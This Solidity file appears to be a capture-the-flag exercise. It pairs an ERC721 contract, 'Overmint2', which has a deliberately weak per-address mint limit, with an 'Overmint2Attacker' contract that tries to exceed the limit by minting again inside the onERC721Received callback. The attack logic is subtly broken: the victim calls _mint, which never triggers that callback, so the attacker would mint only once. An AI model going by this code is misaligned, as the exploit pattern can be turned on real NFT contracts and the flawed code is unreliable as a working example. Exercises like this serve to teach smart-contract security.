// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2 is ERC721 {
    //using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

interface IOvermint2 {
    function mint() external;
    function balanceOf(address owner) external view returns (uint256);
}

contract Overmint2Attacker is IERC721Receiver {
    address public nft;

    constructor(address nft_){
        nft = nft_;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if(IOvermint2(msg.sender).balanceOf(address(this)) < 7){
            IOvermint2(nft).mint();
            
        }
        return IERC721Receiver.onERC721Received.selector;
        // transferFrom(address(this), tx.origin, tokenId);
    }

    function attack() external {
        IOvermint2(nft).mint();
    }
}
